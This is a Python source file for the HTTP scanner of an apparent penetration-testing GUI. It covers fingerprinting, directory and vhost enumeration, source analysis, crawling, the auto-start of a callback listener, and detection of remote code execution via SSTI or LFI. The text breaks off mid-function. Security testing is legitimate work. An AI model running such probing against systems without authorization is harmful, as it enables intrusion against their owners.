# app/tools/http_scanner.py
import requests
import os
import subprocess
import threading
import time
import re
from urllib.parse import urljoin, urlparse
from PyQt6.QtCore import QObject, pyqtSignal, QRunnable
from .http_fingerprint import HTTPFingerprinter
from ..core.http_data_collector import create_http_collector
from ..core.scan_asset_integration import scan_asset_integrator
from ..core.source_patterns import PatternScanner
from ..core.source_map_analyzer import SourceMapAnalyzer
from ..core.listener_manager import listener_manager
from app.core.html_utils import h
from app.core.logger import logger
try:
    from ..core.web_crawler import WebCrawler
except ImportError:
    WebCrawler = None

try:
    from ..core.authenticated_crawler import AuthenticatedCrawler
except ImportError:
    AuthenticatedCrawler = None

class HTTPWorkerSignals(QObject):
    output = pyqtSignal(str)
    finished = pyqtSignal()
    results = pyqtSignal(dict)
    status = pyqtSignal(str)
    progress_start = pyqtSignal(int, str)
    progress_update = pyqtSignal(int, int, str)
    results_ready = pyqtSignal(dict)

class HTTPEnumWorker(QRunnable):
    def __init__(self, target, scan_type="Fingerprinting", wordlist_path=None, extensions=None, dns_server=None, preset="Manual", wordlist_size="Medium", enable_plugins=True, enable_crawl=False, auth_method=None, username="", password="", auth_headers=None, auth_cookies=None, tenant_id="default", listener_id=None):
        super().__init__()
        self.target = target
        self.scan_type = scan_type
        self.wordlist_path = wordlist_path
        self.extensions = extensions or []
        self.dns_server = dns_server
        self.preset = preset
        self.wordlist_size = wordlist_size
        self.enable_plugins = enable_plugins
        self.enable_crawl = enable_crawl
        self.auth_method = auth_method
        self.username = username
        self.password = password
        self.auth_headers = auth_headers or {}
        self.auth_cookies = auth_cookies or {}
        self.tenant_id = tenant_id
        self.listener_id = listener_id
        self.signals = HTTPWorkerSignals()
        self.is_running = True
        self.listener_manager = listener_manager
        self.found_items = []
        self.crawl_tree_data = {}
        self.wildcard_response = None
        self.wildcard_length = None
        self.session = None
        self.authenticated_crawler = None
        # Read SSL verify setting once; used by all inline requests in this worker.
        try:
            from app.core.config import config as _cfg
            self.ssl_verify = _cfg.get('security.ssl_verify', True)
        except Exception:
            self.ssl_verify = True
        # Initialize centralized data collector
        self.data_collector = create_http_collector(tenant_id)
        # Initialize pattern scanner and source map analyzer
        self.pattern_scanner = PatternScanner()
        self.source_map_analyzer = SourceMapAnalyzer()
    
    def stop(self):
        """Stop the HTTP scan"""
        self.is_running = False
        if self.authenticated_crawler:
            self.authenticated_crawler.stop()
        self.signals.output.emit("<p style='color: #FFAA00;'>HTTP scan stopped by user</p><br>")
        self.signals.status.emit("Scan stopped")
    
    def _configure_dns_resolution(self):
        """Configure DNS resolution using global settings"""
        try:
            from urllib.parse import urlparse
            try:
                from app.core.dns_resolver import dns_resolver
            except ImportError:
                dns_resolver = None
            
            parsed = urlparse(self.target)
            hostname = parsed.hostname
            
            if hostname and dns_resolver:
                # Use global DNS resolver
                resolved_ip = dns_resolver.resolve_hostname(hostname)
                if resolved_ip and resolved_ip != hostname:
                    # Store resolved IP and original hostname for requests
                    self.resolved_ip = resolved_ip
                    self.original_hostname = hostname
                    self.signals.output.emit(f"<p style='color: #87CEEB;'>Using DNS: {h(hostname)} → {h(resolved_ip)}</p><br>")
                elif not resolved_ip:
                    self.signals.output.emit(f"<p style='color: #FFAA00;'>DNS resolution failed for {h(hostname)}</p><br>")
                    return False
        except Exception as e:
            self.signals.output.emit(f"<p style='color: #FF6B6B;'>DNS resolution error: {h(str(e))}</p><br>")
            return False
        return True
    
    def _get_session(self):
        """Get or create HTTP session with proper configuration"""
        if not self.session:
            self.session = requests.Session()
            # Honour the global SSL verification setting instead of hardcoding False.
            try:
                from app.core.config import config as _cfg
                self.session.verify = _cfg.get('security.ssl_verify', True)
            except Exception:
                self.session.verify = True
            self.session.timeout = 10
        return self.session
    
    def _make_request(self, method, url, **kwargs):
        """Make HTTP request using resolved IP if available"""
        session = self._get_session()
        
        # If we have a resolved IP, replace hostname in URL and add Host header
        if hasattr(self, 'resolved_ip') and hasattr(self, 'original_hostname'):
            # Replace hostname with IP in the URL
            actual_url = url.replace(self.original_hostname, self.resolved_ip)
            # Add Host header
            headers = kwargs.get('headers', {})
            headers['Host'] = self.original_hostname
            kwargs['headers'] = headers
            return session.request(method, actual_url, **kwargs)
        else:
            return session.request(method, url, **kwargs)
    
    def run(self):
        try:
            # Auto-start listener if configured but not running
            if self.listener_id:
                info = listener_manager.get_listener_info(self.listener_id)
                if info and info['status'] != 'running':
                    if listener_manager.start_listener(self.listener_id):
                        bind_ip = info.get('bind_ip', '0.0.0.0')
                        self.signals.output.emit(f"<p style='color: #00FF41;'>Auto-started listener {h(self.listener_id)} on {h(bind_ip)}:{h(info['port'])}</p><br>")
                    else:
                        self.signals.output.emit(f"<p style='color: #FF6B6B;'>Failed to start listener {h(self.listener_id)}</p><br>")
                elif info and info['status'] == 'running':
                    bind_ip = info.get('bind_ip', '0.0.0.0')
                    self.signals.output.emit(f"<p style='color: #87CEEB;'>Using active listener {h(self.listener_id)} on {h(bind_ip)}:{h(info['port'])}</p><br>")
                elif not info:
                    self.signals.output.emit(f"<p style='color: #FF6B6B;'>Listener {h(self.listener_id)} not found</p><br>")
            
            # Handle target URL formatting with DNS server support
            if not self.target.startswith(('http://', 'https://')):
                self.target = f"http://{self.target}"
            
            # Configure DNS resolution for hostnames
            if not self._configure_dns_resolution():
                return  # Exit if DNS resolution failed
            
            # Start centralized data collection
            # Ensure tenant_id is not None or empty
            if not self.tenant_id or self.tenant_id.strip() == "":
                self.tenant_id = "default"
            
            scan_id = self.data_collector.start_http_scan(
                target=self.target,
                scanner=f"http_scanner_{self.scan_type.lower().replace(' ', '_')}",
                scan_subtype=self.scan_type.lower().replace(' ', '_')
            )
            
            results = {}
            
            if self.scan_type == "Fingerprinting":
                self._basic_fingerprint(results)
            elif self.scan_type == "Directory Enum":
                self._directory_enumeration(results)
                if results.get('directories'):
                    self._build_directory_tree(results)
            elif self.scan_type == "Source Code":
                self._source_code_analysis(results)
                self._build_source_tree(results)
            elif self.scan_type == "Crawler":
                self._web_crawler(results)
                if results.get('crawl_results'):
                    self._build_crawler_tree(results)
            elif self.scan_type == "Enterprise Scripts":
                self._enterprise_scripts(results)
                if results.get('enterprise_results'):
                    self._build_enterprise_tree(results)
            elif self.scan_type == "VHost Brute":
                self._vhost_brute(results)
            elif self.scan_type == "Huginn Scan":
                self._nikto_scan(results)
                if results.get('huginn_scan'):
                    self._build_nikto_tree(results)
            elif self.scan_type == "Full Scan":
                self._full_scan(results)
            else:
                self._basic_fingerprint(results)
            
            if self.crawl_tree_data:
                results['crawl_data'] = self.crawl_tree_data
            if self.found_items:
                results['found_items'] = self.found_items
            
            # Ensure crawl_data is always present for Source Code scans
            if self.scan_type == "Source Code" and 'crawl_data' not in results:
                results['crawl_data'] = self.crawl_tree_data or {}
            
            # Add scan type metadata for UI handling
            results['scan_type'] = self.scan_type
            
            # Complete data collection
            total_results = sum([
                len(results.get('directories', [])),
                len(results.get('source_findings', [])),
                len(results.get('crawl_results', {}))
            ])
            self.data_collector.complete_http_scan(total_results=total_results)
            
            # Integrate with asset management
            self._integrate_with_assets(results)
            
            # Emit final results
            self.signals.results.emit(results)
            # Always emit results_ready for real-time updates
            if self.crawl_tree_data or results:
                if self.crawl_tree_data:
                    results['crawl_data'] = self.crawl_tree_data
                self.signals.results_ready.emit(results)
            self.signals.output.emit(f"<p style='color: #00FF41;'>HTTP enumeration completed.</p><br>")
            
        except Exception as e:
            # Complete data collection with error
            if hasattr(self, 'data_collector'):
                self.data_collector.complete_http_scan(error_message=str(e))
            self.signals.output.emit(f"<p style='color: #FF6B6B;'>Error: {h(str(e))}</p><br>")
            self.signals.status.emit(f"Error: {str(e)}")
        finally:
            self.is_running = False
            self.signals.finished.emit()
            self.signals.status.emit("Scan completed")
    
    def _basic_fingerprint(self, results):
        try:
            self.signals.output.emit("<p style='color: #FFD700;'>Performing advanced fingerprinting...</p><br>")
            
            # Initialize progress bar with estimated steps
            total_steps = 9
            self.signals.progress_start.emit(total_steps, "Starting fingerprinting")
            
            # Force immediate progress update
            try:
                from PyQt6.QtWidgets import QApplication
                QApplication.processEvents()
            except Exception as _exc:
                pass
                logger.debug("Suppressed exception", exc_info=True)
            
            def progress_callback(step, total, message):
                self.signals.progress_update.emit(step, total, message)
                # Force immediate GUI update
                try:
                    from PyQt6.QtWidgets import QApplication
                    QApplication.processEvents()
                    import time
                    time.sleep(0.1)  # Brief pause for visual update
                except Exception as _exc:
                    pass
                    logger.debug("Suppressed exception", exc_info=True)
            
            fingerprinter = HTTPFingerprinter(session=self._get_session(), progress_callback=progress_callback)
            fingerprinter.is_running = lambda: self.is_running  # Pass stop condition
            fingerprinter.listener_manager = self.listener_manager  # Pass listener manager
            self.signals.progress_update.emit(1, total_steps, "Initializing fingerprinter")
            
            # Use DNS-aware target URL
            target_url = self.target
            if hasattr(self, 'resolved_ip') and hasattr(self, 'original_hostname'):
                target_url = self.target.replace(self.original_hostname, self.resolved_ip)
                fingerprinter.session.headers['Host'] = self.original_hostname
            
            fingerprint_results = fingerprinter.comprehensive_fingerprint(target_url)
            
            # Check if scan was stopped during fingerprinting
            if not self.is_running:
                return
            self.signals.progress_update.emit(2, total_steps, "Basic fingerprinting complete")
            
            # Display comprehensive results with proper formatting
            self.signals.progress_update.emit(3, total_steps, "Processing server information")
            if 'server' in fingerprint_results:
                self.signals.output.emit(f"<p><b>Server:</b> {h(fingerprint_results['server'])}</p><br>")
            
            if 'status_code' in fingerprint_results:
                self.signals.output.emit(f"<p><b>Status Code:</b> {h(fingerprint_results['status_code'])}</p><br>")
            
            if 'content_length' in fingerprint_results:
                self.signals.output.emit(f"<p><b>Content Length:</b> {fingerprint_results['content_length']:,} bytes</p><br>")
            
            # Technology detection
            self.signals.progress_update.emit(4, total_steps, "Analyzing technology stack")
            if 'technology' in fingerprint_results:
                tech = fingerprint_results['technology']
                if 'frameworks' in tech and tech['frameworks']:
                    self.signals.output.emit(f"<p style='color: #00FF41;'><b>Detected Frameworks:</b> {', '.join(tech['frameworks'])}</p><br>")
                
                if 'security_headers' in tech and tech['security_headers']:
                    self.signals.output.emit("<p style='color: #87CEEB;'><b>Security Headers:</b></p><br>")
                    for header, value in tech['security_headers'].items():
                        self.signals.output.emit(f"<p style='margin-left: 20px;'><b>{h(header)}:</b> {h(value)}</p><br>")
                    self.signals.output.emit("<br>")
            
            # WAF Detection
            self.signals.progress_update.emit(5, total_steps, "Checking WAF detection")
            if 'waf_detection' in fingerprint_results:
                waf = fingerprint_results['waf_detection']
                if waf.get('detected'):
                    self.signals.output.emit(f"<p style='color: #FF6B6B;'><b>WAF Detected:</b> {h(waf.get('name', 'Unknown'))}</p><br>")
                else:
                    self.signals.output.emit("<p style='color: #00FF41;'><b>WAF:</b> Not detected</p><br>")
            
            # TLS Information
            if 'tls_fingerprint' in fingerprint_results:
                tls = fingerprint_results['tls_fingerprint']
                if 'certificate' in tls:
                    cert = tls['certificate']
                    self.signals.output.emit(f"<p><b>TLS Certificate:</b> {h(cert.get('subject', 'Unknown'))}</p>")
                    if 'san' in cert and cert['san']:
                        self.signals.output.emit(f"<p><b>SAN Domains:</b> {', '.join(cert['san'][:5])}</p>")
                    self.signals.output.emit("<br>")
            
            # Known Files
            self.signals.progress_update.emit(6, total_steps, "Scanning for accessible files")
            if 'known_files' in fingerprint_results and fingerprint_results['known_files']:
                self.signals.output.emit("<p style='color: #FFD700;'><b>Accessible Files:</b></p><br>")
                for file_info in fingerprint_results['known_files'][:10]:
                    self.signals.output.emit(f"<p style='margin-left: 20px;'><b>{h(file_info['path'])}</b> ({h(file_info['content_type'])})</p><br>")
                self.signals.output.emit("<br>")
            
            # Plugin Results
            if 'plugins' in fingerprint_results:
                for plugin_name, plugin_result in fingerprint_results['plugins'].items():
                    if plugin_result and 'error' not in plugin_result:
                        self.signals.output.emit(f"<p style='color: #87CEEB;'><b>{h(plugin_name)}:</b> {h(plugin_result.get('summary', 'Detected'))}</p><br>")
                self.signals.output.emit("<br>")
            
            # JavaScript Analysis
            self.signals.progress_update.emit(7, total_steps, "Analyzing JavaScript files")
            if 'javascript_analysis' in fingerprint_results and fingerprint_results['javascript_analysis']:
                self.signals.output.emit("<p style='color: #FFD700;'><b>JavaScript Analysis:</b></p><br>")
                for js_file in fingerprint_results['javascript_analysis'][:3]:
                    self.signals.output.emit(f"<p style='margin-left: 20px;'><b>File:</b> {h(js_file['url'])}</p><br>")
                    self.signals.output.emit(f"<p style='margin-left: 20px;'><b>Size:</b> {js_file['size']:,} bytes</p><br>")
                    if js_file.get('api_endpoints'):
                        self.signals.output.emit(f"<p style='margin-left: 20px;'><b>API Endpoints:</b> {len(js_file['api_endpoints'])}</p><br>")
                    self.signals.output.emit("<br>")
                self.signals.output.emit("<br>")
            
            # Account Detection - Force execution
            self.signals.progress_update.emit(8, total_steps, "Detecting execution account")
            if 'execution_account' not in fingerprint_results:
                # Force account detection if not already done
                try:
                    account_info = fingerprinter.detect_execution_account(target_url)
                    fingerprint_results['execution_account'] = account_info
                except Exception as e:
                    self.signals.output.emit(f"<p style='color: #FFAA00;'>Account detection failed: {h(str(e))}</p><br>")
                    fingerprint_results['execution_account'] = {'user': None, 'method': None}
            
            if 'execution_account' in fingerprint_results:
                account = fingerprint_results['execution_account']
                
                # Skip debug output
                
                # Skip OOB testing - just show account detection results
                
                # Store account info for OOB payload generation
                self._last_account_info = account
                
                # Show sandbox detection and build tree before stopping
                if account.get('sandbox_detected'):
                    if account.get('sandbox_type') == 'python':
                        self.signals.output.emit(f"<p style='color: #FFD700;'><b>🐍 Python Sandbox Environment Detected</b></p><br>")
                    elif account.get('sandbox_type') == 'ssti':
                        self.signals.output.emit(f"<p style='color: #FFD700;'><b>🔒 SSTI Sandbox Environment Detected</b></p><br>")
                    
                    # Build tree data before stopping
                    self.signals.progress_update.emit(9, total_steps, "Building results tree")
                    self._build_fingerprint_tree(fingerprint_results)
                    results.update(fingerprint_results)
                    results['execution_account'] = account
                    
                    self.signals.output.emit(f"<p style='color: #FFAA00;'>Further testing stopped due to sandbox detection.</p><br>")
                    self.is_running = False
                    return
                    

                
                # Show RCE detection if found
                if account.get('user'):
                    method = account.get('method', 'Unknown')
                    if 'SSTI' in method:
                        self.signals.output.emit(f"<p style='color: #FF6B6B;'><b>🚨 RCE DETECTED via SSTI:</b> {h(account['user'])}</p><br>")
                    elif 'LFI' in method:
                        self.signals.output.emit(f"<p style='color: #FFD700;'><b>📁 LFI DETECTED:</b> {h(account['user'])}</p><br>")
                    else:
                        self.signals.output.emit(f"<p><b>Execution Account:</b> {h(account['user'])} ({h(method)})</p>")
                
                # Show sandbox detection if found (can be in addition to RCE)
                if account.get('sandbox_detected'):
                    if account.get('sandbox_type') == 'python':
                        self.signals.output.emit(f"<p style='color: #FFD700;'><b>🐍 Python Sandbox Environment Detected</b></p><br>")
                    elif account.get('sandbox_type') == 'ssti':
                        self.signals.output.emit(f"<p style='color: #FFD700;'><b>🔒 SSTI Sandbox Environment Detected</b></p><br>")
                    
                    # Build tree data before stopping
                    self._build_fingerprint_tree(fingerprint_results)
                    results.update(fingerprint_results)
                    
                    self.signals.output.emit(f"<p style='color: #FFAA00;'>Further testing stopped due to sandbox detection.</p><br>")
                    results['execution_account'] = account
                    self.is_running = False
                    return
                
                # Show if nothing detected
                if not account.get('user') and not account.get('sandbox_detected'):
                    self.signals.output.emit(f"<p><b>Execution Account:</b> Not detected</p>")
                
                # Only continue with runtime user detection if no sandbox and no RCE found
                if not account.get('sandbox_detected') and not account.get('stop_testing') and not account.get('user'):
                    # Runtime User Detection - Force execution if not already done
                    if 'runtime_user' not in fingerprint_results:
                        try:
                            self.signals.progress_update.emit(9, total_steps, "Detecting runtime user")
                            runtime_info = fingerprinter.detect_runtime_user(target_url, fingerprint_results.get('initial_response'))
                            fingerprint_results['runtime_user'] = runtime_info
                        except Exception as e:
                            self.signals.output.emit(f"<p style='color: #FFAA00;'>Runtime user detection failed: {h(str(e))}</p><br>")
                            fingerprint_results['runtime_user'] = {'user': None}
                    
                    if 'runtime_user' in fingerprint_results:
                        runtime = fingerprint_results['runtime_user']
                        if runtime.get('user'):
                            self.signals.output.emit(f"<p><b>Runtime User:</b> {h(runtime['user'])}</p>")
                        else:
                            self.signals.output.emit(f"<p><b>Runtime User:</b> Not detected</p>")
            
            # Build hierarchical tree structure for graph view
            self.signals.progress_update.emit(total_steps, total_steps, "Building results tree")
            if not results.get('execution_account', {}).get('sandbox_detected'):
                self._build_fingerprint_tree(fingerprint_results)
                results.update(fingerprint_results)
            
            self.signals.output.emit("<br>")
            
        except Exception as e:
            self.signals.output.emit(f"<p style='color: #FFAA00;'>Advanced fingerprinting failed: {h(str(e))}</p><br>")
    
    def _build_fingerprint_tree(self, fingerprint_results):
        """Build table-like structure for Fingerprinting graph view"""
        try:
            # Clear any existing data for clean start
            self.crawl_tree_data = {}
            
            # 1. FINGERPRINT CATEGORY
            fingerprint_key = "Fingerprint"
            self.crawl_tree_data[fingerprint_key] = {
                'name': 'Fingerprint',
                'type': 'category',
                'children': []
            }
            
            # Add fingerprint details with field/value structure
            if 'server' in fingerprint_results:
                self.crawl_tree_data[fingerprint_key]['children'].append({
                    'field': 'Server:',
                    'value': fingerprint_results['server'],
                    'type': 'detail'
                })
            
            if 'status_code' in fingerprint_results:
                self.crawl_tree_data[fingerprint_key]['children'].append({
                    'field': 'Status Code:',
                    'value': str(fingerprint_results['status_code']),
                    'type': 'detail'
                })
            
            if 'content_length' in fingerprint_results:
                self.crawl_tree_data[fingerprint_key]['children'].append({
                    'field': 'Content Length:',
                    'value': f"{fingerprint_results['content_length']:,} bytes",
                    'type': 'detail'
                })
            
            # Technology frameworks
            if 'technology' in fingerprint_results:
                tech = fingerprint_results['technology']
                if 'frameworks' in tech and tech['frameworks']:
                    self.crawl_tree_data[fingerprint_key]['children'].append({
                        'field': 'Detected Frameworks:',
                        'value': ', '.join(tech['frameworks']),
                        'type': 'detail'
                    })
            
            # WAF Detection
            if 'waf_detection' in fingerprint_results:
                waf = fingerprint_results['waf_detection']
                waf_name = waf.get('name', 'Unknown') if waf.get('detected') else 'Not detected'
                self.crawl_tree_data[fingerprint_key]['children'].append({
                    'field': 'WAF Detection:',
                    'value': waf_name,
                    'type': 'detail'
                })
            
            # Plugin results (CMS Detection, Security Analysis)
            if 'plugins' in fingerprint_results:
                for plugin_name, plugin_result in fingerprint_results['plugins'].items():
                    if plugin_result and 'error' not in plugin_result:
                        self.crawl_tree_data[fingerprint_key]['children'].append({
                            'field': f"{plugin_name}:",
                            'value': plugin_result.get('summary', 'Detected'),
                            'type': 'detail'
                        })
            
            # Account Detection
            if 'execution_account' in fingerprint_results:
                account = fingerprint_results['execution_account']
                if account.get('user'):
                    self.crawl_tree_data[fingerprint_key]['children'].append({
                        'field': 'Execution Account:',
                        'value': f"{account['user']} ({account['method']})",
                        'type': 'account'
                    })
                else:
                    self.crawl_tree_data[fingerprint_key]['children'].append({
                        'field': 'Execution Account:',
                        'value': 'Not detected',
                        'type': 'account'
                    })
            
            # Runtime User Detection
            if 'runtime_user' in fingerprint_results:
                runtime = fingerprint_results['runtime_user']
                if runtime.get('user'):
                    self.crawl_tree_data[fingerprint_key]['children'].append({
                        'field': 'Runtime User:',
                        'value': f"{runtime['user']} ({runtime['method']})",
                        'type': 'runtime_user'
                    })
                else:
                    self.crawl_tree_data[fingerprint_key]['children'].append({
                        'field': 'Runtime User:',
                        'value': 'Not detected',
                        'type': 'runtime_user'
                    })
            
            # 2. ACCESSIBLE FILES CATEGORY
            if 'known_files' in fingerprint_results and fingerprint_results['known_files']:
                files_key = "Accessible Files"
                self.crawl_tree_data[files_key] = {
                    'name': 'Accessible Files',
                    'type': 'category',
                    'children': []
                }
                
                for file_info in fingerprint_results['known_files'][:10]:
                    self.crawl_tree_data[files_key]['children'].append({
                        'field': file_info['path'],
                        'value': file_info['content_type'],
                        'type': 'file'
                    })
            
            # 3. JAVASCRIPT ANALYSIS CATEGORY
            if 'javascript_analysis' in fingerprint_results and fingerprint_results['javascript_analysis']:
                js_key = "JavaScript Analysis"
                self.crawl_tree_data[js_key] = {
                    'name': 'JavaScript Analysis',
                    'type': 'category',
                    'children': []
                }
                
                for i, js_file in enumerate(fingerprint_results['javascript_analysis'][:3]):
                    # File entry
                    self.crawl_tree_data[js_key]['children'].append({
                        'field': 'File:',
                        'value': js_file['url'],
                        'type': 'js_detail'
                    })
                    # Size entry
                    self.crawl_tree_data[js_key]['children'].append({
                        'field': 'Size:',
                        'value': f"{js_file['size']:,} bytes",
                        'type': 'js_detail'
                    })
                    # API endpoints entry
                    if js_file.get('api_endpoints'):
                        self.crawl_tree_data[js_key]['children'].append({
                            'field': 'API:',
                            'value': str(len(js_file['api_endpoints'])),
                            'type': 'js_detail'
                        })
            
        except Exception as _exc:
            pass
            logger.debug("Suppressed exception", exc_info=True)
    
    def _detect_wildcard_responses(self):
        """Detect wildcard responses to filter false positives"""
        try:
            # Test with random string that shouldn't exist
            random_path = f"{''.join(__import__('random').choices('abcdefghijklmnopqrstuvwxyz', k=15))}"
            test_url = f"{self.target.rstrip('/')}/{random_path}"
            
            response = self._make_request('GET', test_url, timeout=5, allow_redirects=False)
            
            if response.status_code in [200, 301, 302]:
                self.wildcard_response = response.status_code
                self.wildcard_length = len(response.content)
                self.signals.output.emit(f"<p style='color: #FFAA00;'>Wildcard response detected (Status: {h(response.status_code)}, Length: {h(self.wildcard_length)})</p><br>")
            
        except Exception as _exc:
            pass
            logger.debug("Suppressed exception", exc_info=True)
    
    def _check_403_catchall(self):
        """Check for 403 catch-all responses before directory enumeration"""
        try:
            test_paths = ['nonexistent_test_path_123', 'random_dir_456', 'fake_path_789']
            responses = []
            
            for path in test_paths:
                test_url = f"{self.target.rstrip('/')}/{path}"
                session = self._get_session()
                response = session.get(test_url, timeout=5, allow_redirects=False)
                
                if response.status_code == 403:
                    responses.append({
                        'status': response.status_code,
                        'length': len(response.content),
                        'content_hash': hash(response.content[:500])
                    })
            
            # Check if all 403 responses are identical
            if len(responses) >= 2:
                first_response = responses[0]
                identical_count = sum(1 for r in responses if 
                    r['status'] == first_response['status'] and
                    r['length'] == first_response['length'] and
                    r['content_hash'] == first_response['content_hash'])
                
                if identical_count >= 2:
                    self.catchall_403_detected = True
                    self.catchall_403_length = first_response['length']
                    self.signals.output.emit(f"<p style='color: #FFAA00;'>⚠️ 403 catch-all detected (Length: {h(first_response['length'])} bytes)</p>")
                    self.signals.output.emit("<p style='color: #FFAA00;'>Directory enumeration will filter generic 403 responses</p><br>")
                else:
                    self.catchall_403_detected = False
            else:
                self.catchall_403_detected = False
                
        except Exception:
            self.catchall_403_detected = False
    
    def _is_valid_response(self, response):
        """Check if response is valid (not a wildcard false positive)"""
        if response.status_code in [200, 301, 302, 403]:
            # If we detected wildcard responses, filter them out
            if self.wildcard_response and self.wildcard_length:
                if (response.status_code == self.wildcard_response and 
                    abs(len(response.content) - self.wildcard_length) < 100):
                    return False  # Likely a wildcard response
            
            # Check for 403 catch-all responses
            if (hasattr(self, 'catchall_403_detected') and self.catchall_403_detected and 
                response.status_code == 403 and 
                hasattr(self, 'catchall_403_length') and 
                len(response.content) == self.catchall_403_length):
                return False  # Generic 403 catch-all response
            
            return True
        return False
    
    def _directory_enumeration(self, results):
        try:
            self.signals.output.emit("<p style='color: #FFD700;'>Starting intelligent directory enumeration...</p><br>")
            
            # Detect wildcard responses first
            self._detect_wildcard_responses()
            
            directories = []
            if self.wordlist_path and os.path.exists(self.wordlist_path):
                with open(self.wordlist_path, 'r') as f:
                    directories = [line.strip() for line in f if line.strip()]
            else:
                directories = ['admin', 'login', 'test', 'backup', 'config', 'uploads', 'images', 'css', 'js']
            
            found_dirs = []
            self.signals.progress_start.emit(min(len(directories), 200), "Starting directory enumeration")
            
            for i, directory in enumerate(directories[:200]):
                if not self.is_running:
                    self.signals.output.emit("<p style='color: #FFAA00;'>Directory enumeration stopped by user</p><br>")
                    break
                
                try:
                    url = f"{self.target.rstrip('/')}/{directory}"
                    response = self._make_request('GET', url, timeout=5, allow_redirects=False)
                    
                    # Intelligent filtering based on wildcard detection
                    if self._is_valid_response(response):
                        found_dirs.append({'path': directory, 'status': response.status_code, 'size': len(response.content)})
                        self.signals.output.emit(f"<p style='color: #00FF41;'>Found: /{h(directory)}</p>")
                        self.signals.output.emit(f"<p>&nbsp;&nbsp;Status: {h(response.status_code)}</p>")
                        self.signals.output.emit(f"<p>&nbsp;&nbsp;Size: {len(response.content):,} bytes</p><br>")
                        
                        self._update_crawl_tree([{'path': directory, 'status': response.status_code}])
                        
                        # Test extensions for valid directories
                        for ext in self.extensions[:5]:
                            try:
                                ext_url = f"{url}{ext}"
                                ext_response = self._make_request('GET', ext_url, timeout=3, allow_redirects=False)
                                if self._is_valid_response(ext_response):
                                    ext_item = {'path': f"{directory}{ext}", 'status': ext_response.status_code, 'size': len(ext_response.content)}
                                    found_dirs.append(ext_item)
                                    self.signals.output.emit(f"<p style='color: #00FF41;'>Found: /{h(directory)}{h(ext)}</p>")
                                    self.signals.output.emit(f"<p>&nbsp;&nbsp;Status: {h(ext_response.status_code)}</p>")
                                    self.signals.output.emit(f"<p>&nbsp;&nbsp;Size: {len(ext_response.content):,} bytes</p><br>")
                                    self._update_crawl_tree([ext_item])
                            except Exception as _exc:
                                pass
                                logger.debug("Suppressed exception", exc_info=True)
                
                except Exception as _exc:
                    pass
                    logger.debug("Suppressed exception", exc_info=True)
                
                self.signals.progress_update.emit(i + 1, len(found_dirs), f"Checking: {directory}")
                
                # Real-time crawl tree updates
                if found_dirs and i % 10 == 0:  # Update every 10 items
                    if self.crawl_tree_data:
                        self.signals.results_ready.emit({
                            'crawl_data': self.crawl_tree_data,
                            'found_items': self.found_items
                        })
            
            if found_dirs:
                # Collect directory data
                self.data_collector.collect_directories(self.target, found_dirs)
                
                results['directories'] = found_dirs
                self.signals.output.emit(f"<p style='color: #00FF41;'>Directory enumeration complete:</p>")
                self.signals.output.emit(f"<p>&nbsp;&nbsp;Found: {len(found_dirs)} accessible paths</p>")
                self.signals.output.emit(f"<p>&nbsp;&nbsp;Filtered: {len(directories) - len(found_dirs)} false positives</p><br>")
            else:
                self.signals.output.emit("<p style='color: #FFAA00;'>No accessible directories found</p><br>")
                
        except Exception as e:
            self.signals.output.emit(f"<p style='color: #FFAA00;'>Directory enumeration failed: {h(str(e))}</p><br>")
    
    def _display_formatted_source(self, content):
        """Display formatted source code with syntax highlighting"""
        try:
            # Try to use pygments for syntax highlighting
            try:
                from pygments import highlight
                from pygments.lexers import HtmlLexer
                from pygments.formatters import HtmlFormatter
                
                lexer = HtmlLexer()
                formatter = HtmlFormatter(style='monokai', noclasses=True)
                highlighted = highlight(content[:5000], lexer, formatter)  # Limit to first 5000 chars
                
                self.signals.output.emit("<br><p style='color: #87CEEB;'><b>Source Code (Syntax Highlighted):</b></p><br>")
                self.signals.output.emit(f"<div style='background: #272822; padding: 10px; border-radius: 5px; max-height: 400px; overflow-y: auto; margin: 10px 0;'>{highlighted}</div>")
                
            except ImportError:
                # Fallback to plain text with basic formatting
                self.signals.output.emit("<br><p style='color: #87CEEB;'><b>Source Code:</b></p><br>")
                formatted_content = content[:2000].replace('<', '&lt;').replace('>', '&gt;')
                self.signals.output.emit(f"<pre style='background: #2d2d2d; color: #f8f8f2; padding: 10px; border-radius: 5px; max-height: 300px; overflow-y: auto; margin: 10px 0;'>{h(formatted_content)}</pre>")
            
            # Add separator line before analysis results
            self.signals.output.emit("<hr style='border: 1px solid #444; margin: 20px 0;'>")
            self.signals.output.emit("<p style='color: #FFD700;'><b>📊 Source Code Analysis Results:</b></p><br>")
                
        except Exception as e:
            self.signals.output.emit(f"<p style='color: #FFAA00;'>Could not format source code: {h(str(e))}</p><br>")
    
    def _analyze_source_content(self, content):
        """Analyze source content using modular pattern scanner"""
        # Extract inline script content for analysis
        script_content = self._extract_script_content(content)
        
        # Analyze HTML structure with BeautifulSoup
        html_findings, html_detailed = self._analyze_html_structure(content)
        
        # Use modular pattern scanner
        findings, detailed_findings, risk_assessment = self.pattern_scanner.scan_content(content, script_content)
        
        # RCE via Python Jail Bypass detection
        rce_findings, rce_detailed = self._scan_for_rce_indicators(content, self.target)
        findings.extend(rce_findings)
        detailed_findings.update(rce_detailed)
        
        # Add RCE findings to risk assessment
        for rce_finding in rce_findings:
            if 'dangerous eval' in rce_finding.lower() or 'dangerous exec' in rce_finding.lower():
                risk_assessment['risk_score'] += 10
                risk_assessment['high_risk_findings'].append('Python code execution risk')
            elif 'code execution endpoint' in rce_finding.lower():
                risk_assessment['risk_score'] += 8
                risk_assessment['high_risk_findings'].append('Code execution endpoint')
            elif 'blacklist-based filtering' in rce_finding.lower():
                risk_assessment['risk_score'] += 6
                risk_assessment['high_risk_findings'].append('Weak sandbox filtering')
        
        # Merge HTML structure findings
        findings.extend(html_findings)
        detailed_findings.update(html_detailed)
        
        # Add HTML findings to risk assessment
        for html_finding in html_findings:
            if 'inline scripts' in html_finding.lower():
                risk_assessment['risk_score'] += 3
            elif 'login forms' in html_finding.lower():
                risk_assessment['risk_score'] += 4
            elif 'developer comments' in html_finding.lower():
                risk_assessment['risk_score'] += 5
                risk_assessment['high_risk_findings'].append('Developer comments')
            elif 'jwt tokens' in html_finding.lower() or 'api keys' in html_finding.lower():
                risk_assessment['risk_score'] += 8
                risk_assessment['high_risk_findings'].append(html_finding.split(' (')[0])
        
        # Enhanced comment analysis
        comment_findings, comment_details, comment_score = self.pattern_scanner.analyze_comments(content)
        findings.extend(comment_findings)
        detailed_findings.update(comment_details)
        risk_assessment['risk_score'] += comment_score
        
        # Update high-risk findings if comment score is significant
        if comment_score >= 6:
